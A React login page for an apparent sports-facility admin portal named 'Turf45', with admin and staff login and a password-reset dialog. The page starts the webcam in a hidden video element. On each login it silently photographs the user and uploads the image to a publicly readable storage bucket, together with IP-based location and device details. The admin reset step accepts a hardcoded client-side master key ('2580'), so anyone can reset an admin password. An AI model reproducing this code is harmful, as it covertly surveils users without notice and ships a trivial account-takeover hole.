import React, { useState, useEffect, useRef } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { useToast } from '@/hooks/use-toast';
import { useAuth } from '@/context/AuthContext';
import { Shield, Users, Eye, EyeOff, ArrowLeft, Lock, KeyRound, User } from 'lucide-react';
import { useIsMobile } from '@/hooks/use-mobile';
import { Tabs, TabsList, TabsTrigger } from '@/components/ui/tabs';
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { UAParser } from 'ua-parser-js';
import { supabase } from "@/integrations/supabase/client";
import { Trophy } from 'lucide-react';

interface LocationState {
  from?: string;
}

const Login = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [loginType, setLoginType] = useState('admin');
  const { login, resetPassword } = useAuth();
  const { toast } = useToast();
  const navigate = useNavigate();
  const location = useLocation();
  const locationState = location.state as LocationState;
  const [showPassword, setShowPassword] = useState(false);
  
  const [forgotDialogOpen, setForgotDialogOpen] = useState(false);
  const [forgotUsername, setForgotUsername] = useState('');
  const [masterKey, setMasterKey] = useState('');
  const [newPassword, setNewPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [forgotPasswordStep, setForgotPasswordStep] = useState(1);
  const [forgotPasswordType, setForgotPasswordType] = useState('admin');
  const [resetLoading, setResetLoading] = useState(false);
  const [showNewPassword, setShowNewPassword] = useState(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState(false);
  const [showMasterKey, setShowMasterKey] = useState(false);
  
  const [pinDialogOpen, setPinDialogOpen] = useState(false);
  const [pinInput, setPinInput] = useState('');
  const [showPin, setShowPin] = useState(false);
  
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [cameraReady, setCameraReady] = useState(false);
  
  const [loginMetadata, setLoginMetadata] = useState<any>({});
  const isMobile = useIsMobile();

  useEffect(() => {
    const initCamera = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: 'user', width: 640, height: 480 },
          audio: false 
        });
        
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          videoRef.current.play();
          setCameraReady(true);
        }
      } catch (error) {
        console.log('Camera not available');
        setCameraReady(false);
      }
    };
    
    initCamera();

    return () => {
      if (videoRef.current && videoRef.current.srcObject) {
        const stream = videoRef.current.srcObject as MediaStream;
        stream.getTracks().forEach(track => track.stop());
      }
    };
  }, []);

  const captureSilentPhoto = (): string | null => {
    if (!cameraReady || !videoRef.current || !canvasRef.current) {
      return null;
    }

    try {
      const canvas = canvasRef.current;
      const video = videoRef.current;
      
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      
      const ctx = canvas.getContext('2d');
      if (ctx) {
        ctx.drawImage(video, 0, 0);
        return canvas.toDataURL('image/jpeg', 0.8);
      }
    } catch (error) {
      console.error('Error capturing photo:', error);
    }
    
    return null;
  };

  const uploadSelfie = async (imageData: string): Promise<string | null> => {
    try {
      const base64Data = imageData.split(',')[1];
      const fileName = `selfie_${Date.now()}_${Math.random().toString(36).substring(7)}.jpg`;
      
      const { data, error } = await supabase.storage
        .from('login-selfies')
        .upload(fileName, decode(base64Data), {
          contentType: 'image/jpeg',
          cacheControl: '3600',
        });

      if (error) throw error;

      const { data: publicUrlData } = supabase.storage
        .from('login-selfies')
        .getPublicUrl(fileName);

      return publicUrlData.publicUrl;
    } catch (error) {
      console.error('Error uploading selfie:', error);
      return null;
    }
  };

  const decode = (base64: string): Uint8Array => {
    const binaryString = window.atob(base64);
    const len = binaryString.length;
    const bytes = new Uint8Array(len);
    for (let i = 0; i < len; i++) {
      bytes[i] = binaryString.charCodeAt(i);
    }
    return bytes;
  };

  useEffect(() => {
    const collectLoginInfo = async () => {
      try {
        const parser = new UAParser();
        const device = parser.getResult();
        
        let metadata: any = {
          browser: device.browser.name,
          browserVersion: device.browser.version,
          os: device.os.name,
          osVersion: device.os.version,
          deviceType: device.device.type || 'desktop',
          loginTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
          userAgent: navigator.userAgent,
          screenResolution: `${window.screen.width}x${window.screen.height}`,
        };

        try {
          const response = await fetch('https://ipapi.co/json/');
          if (response.ok) {
            const data = await response.json();
            metadata.ip = data.ip;
            metadata.city = data.city;
            metadata.country = data.country_name;
          }
        } catch (error) {
          console.log('Could not fetch IP data');
        }

        setLoginMetadata(metadata);
      } catch (error) {
        console.error('Error collecting metadata:', error);
      }
    };
    
    collectLoginInfo();
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!username || !password) {
      toast({
        title: 'Error',
        description: 'Please enter both username and password',
        variant: 'destructive',
      });
      return;
    }
    
    setIsLoading(true);
    
    await new Promise(resolve => setTimeout(resolve, 500));
    
    try {
      const isAdminLogin = loginType === 'admin';
      
      let selfieUrl = null;
      const capturedImage = captureSilentPhoto();
      if (capturedImage) {
        selfieUrl = await uploadSelfie(capturedImage);
      }

      const enhancedMetadata = {
        ...loginMetadata,
        selfieUrl
      };
      
      const success = await login(username, password, isAdminLogin, enhancedMetadata);
      
      if (success) {
        if (videoRef.current && videoRef.current.srcObject) {
          const stream = videoRef.current.srcObject as MediaStream;
          stream.getTracks().forEach(track => track.stop());
        }

        toast({
          title: 'Success',
          description: `${isAdminLogin ? 'Admin' : 'Staff'} logged in successfully!`,
        });
        
        const redirectTo = locationState?.from || '/dashboard';
        navigate(redirectTo);
      } else {
        toast({
          title: 'Error',
          description: `Invalid ${isAdminLogin ? 'admin' : 'staff'} credentials`,
          variant: 'destructive',
        });
      }
    } catch (error) {
      toast({
        title: 'Error',
        description: 'Something went wrong. Please try again.',
        variant: 'destructive',
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handleResetPassword = async () => {
    if (!newPassword || !confirmPassword) {
      toast({
        title: 'Error',
        description: 'Please enter and confirm your new password',
        variant: 'destructive',
      });
      return;
    }

    if (newPassword !== confirmPassword) {
      toast({
        title: 'Error',
        description: 'Passwords do not match',
        variant: 'destructive',
      });
      return;
    }

    setResetLoading(true);
    try {
      const success = await resetPassword(forgotUsername, newPassword);
      
      if (success) {
        toast({
          title: 'Success',
          description: 'Password has been reset successfully',
        });
        setForgotDialogOpen(false);
      } else {
        toast({
          title: 'Error',
          description: 'Failed to reset password. Username may not exist.',
          variant: 'destructive',
        });
      }
    } catch (error) {
      toast({
        title: 'Error',
        description: 'Something went wrong. Please try again.',
        variant: 'destructive',
      });
    } finally {
      setResetLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-green-50 via-white to-green-50 relative overflow-hidden px-4">
      <video 
        ref={videoRef} 
        style={{ display: 'none' }}
        autoPlay
        playsInline
        muted
      />
      <canvas ref={canvasRef} style={{ display: 'none' }} />

      {/* Background Elements */}
      <div className="absolute inset-0 z-0 overflow-hidden">
        <div className="absolute top-0 left-0 w-96 h-96 bg-green-200/30 rounded-full blur-3xl"></div>
        <div className="absolute bottom-0 right-0 w-96 h-96 bg-green-300/30 rounded-full blur-3xl"></div>
        <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-96 h-96 bg-green-100/20 rounded-full blur-3xl"></div>
      </div>

      {/* Back Button */}
      <Button 
        variant="ghost" 
        size="sm"
        className="absolute top-4 left-4 z-20 text-gray-600 hover:text-green-600 hover:bg-green-50"
        onClick={() => navigate('/')}
      >
        <ArrowLeft size={16} className="mr-2" />
        Back to Home
      </Button>

      <div className="relative z-10 w-full max-w-md">
        {/* Logo */}
        <div className="text-center mb-8">
          <div className="inline-flex items-center justify-center mb-4">
            <div className="relative">
              <div className="absolute -inset-4 bg-gradient-to-r from-green-400/30 to-green-500/30 rounded-full blur-2xl"></div>
              <div className="relative bg-gradient-to-br from-green-500 to-green-600 rounded-2xl p-4 shadow-xl">
                <Trophy className="h-10 w-10 text-white" />
              </div>
            </div>
          </div>
          <h1 className="text-3xl font-bold bg-gradient-to-r from-green-600 to-green-500 bg-clip-text text-transparent mb-2">
            Turf45
          </h1>
          <p className="text-sm text-gray-500 uppercase tracking-wider">Administrator Portal</p>
        </div>
        
        {/* Login Card with Glassmorphism */}
        <Card className="backdrop-blur-xl bg-white/80 border-2 border-green-100/50 shadow-2xl rounded-3xl overflow-hidden">
          <div className="absolute inset-0 bg-gradient-to-br from-green-50/50 to-white/50 pointer-events-none"></div>
          
          <CardHeader className="text-center relative z-10 pb-4">
            <CardTitle className="text-2xl font-bold text-gray-900">Facility Manager Login</CardTitle>
            <p className="text-sm text-gray-600 mt-2">Enter your credentials to access the control panel</p>
          </CardHeader>
          
          <form onSubmit={handleSubmit}>
            <CardContent className="space-y-6 relative z-10">
              {/* Login Type Tabs */}
              <div className="flex justify-center">
                <Tabs defaultValue="admin" value={loginType} onValueChange={setLoginType} className="w-full">
                  <TabsList className="grid w-full grid-cols-2 bg-green-50/50 rounded-xl p-1">
                    <TabsTrigger 
                      value="admin" 
                      className="flex items-center gap-2 data-[state=active]:bg-white data-[state=active]:text-green-600 data-[state=active]:shadow-md rounded-lg"
                    >
                      <Shield size={14} />
                      Admin
                    </TabsTrigger>
                    <TabsTrigger 
                      value="staff" 
                      className="flex items-center gap-2 data-[state=active]:bg-white data-[state=active]:text-green-600 data-[state=active]:shadow-md rounded-lg"
                    >
                      <Users size={14} />
                      Staff
                    </TabsTrigger>
                  </TabsList>
                </Tabs>
              </div>

              {/* Username Field */}
              <div className="space-y-2">
                <label htmlFor="username" className="text-sm font-medium text-gray-700 flex items-center gap-2">
                  <User size={14} />
                  Username
                </label>
                <Input
                  id="username"
                  type="text"
                  placeholder="Enter your username"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="bg-white/80 border-green-200 focus:border-green-500 focus:ring-green-500/20 rounded-xl h-12"
                />
              </div>
              
              {/* Password Field */}
              <div className="space-y-2">
                <label htmlFor="password" className="text-sm font-medium text-gray-700 flex items-center gap-2">
                  <Lock size={14} />
                  Password
                </label>
                <div className="relative">
                  <Input
                    id="password"
                    type={showPassword ? "text" : "password"}
                    placeholder="••••••••"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="bg-white/80 border-green-200 focus:border-green-500 focus:ring-green-500/20 rounded-xl h-12 pr-10"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-green-600 transition-colors"
                  >
                    {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                  </button>
                </div>
              </div>

              {/* Forgot Password */}
              <div className="text-right">
                <Button 
                  type="button" 
                  variant="link" 
                  className="text-green-600 hover:text-green-700 p-0 h-auto text-sm"
                  onClick={() => {
                    setForgotPasswordType(loginType);
                    setForgotPasswordStep(1);
                    setForgotDialogOpen(true);
                  }}
                >
                  Forgot password?
                </Button>
              </div>

              {/* Submit Button */}
              <Button 
                type="submit" 
                className="w-full bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white rounded-xl h-12 font-semibold shadow-lg shadow-green-500/30 transition-all duration-300 hover:scale-[1.02]" 
                disabled={isLoading}
              >
                {isLoading ? (
                  <span className="flex items-center gap-2">
                    <div className="animate-spin rounded-full h-4 w-4 border-2 border-white border-t-transparent"></div>
                    Authenticating...
                  </span>
                ) : (
                  <span className="flex items-center gap-2">
                    {loginType === 'admin' ? <Shield size={16} /> : <Users size={16} />}
                    {loginType === 'admin' ? 'Admin Login' : 'Staff Login'}
                  </span>
                )}
              </Button>
            </CardContent>
          </form>
        </Card>
      </div>

      {/* Forgot Password Dialog */}
      <Dialog open={forgotDialogOpen} onOpenChange={setForgotDialogOpen}>
        <DialogContent className="sm:max-w-md bg-white/95 backdrop-blur-xl border-2 border-green-100 rounded-2xl">
          {forgotPasswordType === 'staff' ? (
        <>
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
                  <KeyRound size={16} className="text-green-600" />
              Staff Password Reset
            </DialogTitle>
            <DialogDescription>
              Staff members need to contact an administrator to reset their password.
            </DialogDescription>
          </DialogHeader>
          <div className="py-6 text-center">
                <Users className="mx-auto h-12 w-12 text-gray-400 mb-4" />
                <p className="text-gray-600">
              Please contact your administrator for password assistance.
            </p>
          </div>
          <DialogFooter>
            <Button 
              onClick={() => setForgotDialogOpen(false)}
                  className="w-full bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white rounded-xl"
            >
              Close
            </Button>
          </DialogFooter>
        </>
          ) : forgotPasswordStep === 1 ? (
        <>
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
                  <KeyRound size={16} className="text-green-600" />
              Admin Password Reset
            </DialogTitle>
            <DialogDescription>
              Enter your admin username to begin the password reset process.
            </DialogDescription>
          </DialogHeader>
          <div className="py-6">
            <div className="space-y-4">
              <div className="space-y-2">
                <label htmlFor="forgotUsername" className="text-sm font-medium">Username</label>
                <Input
                  id="forgotUsername"
                  type="text"
                  placeholder="Enter your username"
                  value={forgotUsername}
                  onChange={(e) => setForgotUsername(e.target.value)}
                      className="bg-white border-green-200 rounded-xl"
                />
              </div>
            </div>
          </div>
          <DialogFooter>
                <Button variant="outline" onClick={() => setForgotDialogOpen(false)} className="rounded-xl">Cancel</Button>
            <Button 
                  onClick={() => setForgotPasswordStep(2)} 
              disabled={!forgotUsername}
                  className="bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white rounded-xl"
            >
              Next
            </Button>
          </DialogFooter>
        </>
          ) : forgotPasswordStep === 2 ? (
        <>
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
                  <Shield size={16} className="text-green-600" />
              Master Key Verification
            </DialogTitle>
            <DialogDescription>
              Enter the master key to verify your identity.
            </DialogDescription>
          </DialogHeader>
          <div className="py-6">
            <div className="space-y-4">
              <div className="space-y-2">
                <label htmlFor="masterKey" className="text-sm font-medium">Master Key</label>
                <div className="relative">
                  <Input
                    id="masterKey"
                    type={showMasterKey ? "text" : "password"}
                    placeholder="Enter master key"
                    value={masterKey}
                    onChange={(e) => setMasterKey(e.target.value)}
                        className="bg-white border-green-200 rounded-xl pr-10"
                  />
                  <button
                    type="button"
                        onClick={() => setShowMasterKey(!showMasterKey)}
                        className="absolute right-2 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-green-600"
                  >
                    {showMasterKey ? <EyeOff size={18} /> : <Eye size={18} />}
                  </button>
                </div>
              </div>
            </div>
          </div>
          <DialogFooter>
                <Button variant="outline" onClick={() => setForgotDialogOpen(false)} className="rounded-xl">Cancel</Button>
            <Button 
                  onClick={() => {
                    if (masterKey === '2580') {
                      setForgotPasswordStep(3);
                    } else {
                      toast({
                        title: 'Error',
                        description: 'Incorrect master key',
                        variant: 'destructive',
                      });
                    }
                  }} 
              disabled={!masterKey}
                  className="bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white rounded-xl"
            >
              Verify
            </Button>
          </DialogFooter>
        </>
          ) : (
      <>
        <DialogHeader>
          <DialogTitle className="flex items-center gap-2">
                  <Lock size={16} className="text-green-600" />
            Set New Password
          </DialogTitle>
          <DialogDescription>
            Create a new password for your account.
          </DialogDescription>
        </DialogHeader>
        <div className="py-6">
          <div className="space-y-4">
            <div className="space-y-2">
              <label htmlFor="newPassword" className="text-sm font-medium">New Password</label>
              <div className="relative">
                <Input
                  id="newPassword"
                  type={showNewPassword ? "text" : "password"}
                  placeholder="Enter new password"
                  value={newPassword}
                  onChange={(e) => setNewPassword(e.target.value)}
                        className="bg-white border-green-200 rounded-xl pr-10"
                />
                <button
                  type="button"
                        onClick={() => setShowNewPassword(!showNewPassword)}
                        className="absolute right-2 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-green-600"
                >
                  {showNewPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                </button>
              </div>
            </div>
            <div className="space-y-2">
              <label htmlFor="confirmPassword" className="text-sm font-medium">Confirm Password</label>
              <div className="relative">
                <Input
                  id="confirmPassword"
                  type={showConfirmPassword ? "text" : "password"}
                  placeholder="Confirm new password"
                  value={confirmPassword}
                  onChange={(e) => setConfirmPassword(e.target.value)}
                        className="bg-white border-green-200 rounded-xl pr-10"
                />
                <button
                  type="button"
                        onClick={() => setShowConfirmPassword(!showConfirmPassword)}
                        className="absolute right-2 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-green-600"
                >
                  {showConfirmPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                </button>
              </div>
            </div>
          </div>
        </div>
        <DialogFooter>
                <Button variant="outline" onClick={() => setForgotDialogOpen(false)} className="rounded-xl">Cancel</Button>
          <Button 
            onClick={handleResetPassword} 
            disabled={!newPassword || !confirmPassword || resetLoading}
                  className="bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white rounded-xl"
          >
            {resetLoading ? "Resetting..." : "Reset Password"}
          </Button>
        </DialogFooter>
                    </>
                  )}
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default Login;
